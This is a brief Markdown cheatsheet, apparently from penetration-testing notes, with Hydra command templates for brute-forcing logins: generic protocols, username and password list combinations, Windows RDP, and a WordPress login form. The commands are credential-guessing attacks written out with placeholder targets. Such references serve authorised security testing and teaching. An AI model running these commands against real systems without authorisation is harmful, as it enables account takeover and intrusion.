# Brute Force

## Hydra, mini cheatsheet

```bash
# Brute force against a protocol of your choice
hydra -P <wordlist> -v <ip> <protocol>
```

```bash
# You can use Hydra to bruteforce usernames as well as passwords.  
# It will loop through every combination in your lists. (-vV = verbose mode, showing login attempts)
hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol>
```
```bash
# Attack a Windows Remote Desktop with a password list.
hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>
```
```bash
# Craft a more specific request for Hydra to brute force Wordpress
hydra -l <username> -P <password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
